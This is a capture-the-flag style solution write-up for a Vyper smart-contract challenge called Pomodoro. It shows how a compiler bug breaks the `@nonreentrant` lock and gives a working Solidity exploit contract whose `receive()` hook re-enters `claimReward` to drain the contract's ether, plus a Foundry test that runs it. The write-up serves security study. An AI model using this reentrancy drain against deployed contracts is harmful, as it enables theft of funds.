# 0xjarix-Pomodoro - Solution

## Find the vulnerability

Looking at the contract we found that the only external call is present in `claimReward` function. Let's dive deeper.

```python
@external
@nonreentrant('')
def claimReward(_tokenId: uint256):
    # Verify NFT ownership
    assert PomodoroNFT(self.nftAddress).ownerOf(_tokenId) == msg.sender
    session: Session = self.sessions[msg.sender]

    # Ensure session is not currently paused
    assert not session.isPaused and session.ongoing

    # Calculate total session time including any previous accumulations
    totalSessionTime: uint256 = session.accumulatedTime
    totalSessionTime += block.timestamp - session.lastPause

    # Verify enough time has passed for a reward
    assert totalSessionTime >= self.sessionDuration

    # Calculate how many rewards are due
    rewardsDue: uint256 = totalSessionTime / self.sessionDuration

    # send rewards
    raw_call(msg.sender, b"", value=rewardsDue * (10 ** 16))

    # Reset or adjust session details based on remaining time
    self.remainingTime = totalSessionTime % self.sessionDuration
    self.sessions[msg.sender].ongoing = False
```

The function has a `@nonreentrant` decorator so in theory it can't be reentered. However looking at vyper specific version vulnerability [here](https://security.snyk.io/package/pip/vyper/0.3.9) we found [this](https://security.snyk.io/vuln/SNYK-PYTHON-VYPER-5905483). `@nonreentrant('')` lock is bugged and do not check for reentrancy. Bingo!

## Exploit the contract

To exploit the contract we just need to create a contract that re-enter the function.

```solidity
contract Exploiter {
    IPomodoro pomodoro;
    IPomodoroNFT pomodoroNFT;

    constructor(address _pomodoro, address _pomodoroNFT) {
        pomodoro = IPomodoro(_pomodoro);
        pomodoroNFT = IPomodoroNFT(_pomodoroNFT);
    }

    function mintAndStartWorkSession() external payable {
        pomodoroNFT.mint{value: 0.1 ether}(address(this));
        pomodoro.startWorkSession(4);
    }

    function attack() external {
        pomodoro.claimReward(4);
    }

    receive() external payable {
        if (address(pomodoro).balance > 0) {
            pomodoro.claimReward(4);
        }
    }
}
```

Just warp for 1 pomodoro session and attack the contract.

```solidity
Exploiter exploiter = new Exploiter(address(pomodoro), address(pomodoroNFT));
exploiter.mintAndStartWorkSession{value: 0.1 ether}();
vm.warp(25 minutes + 1);
exploiter.attack();
```
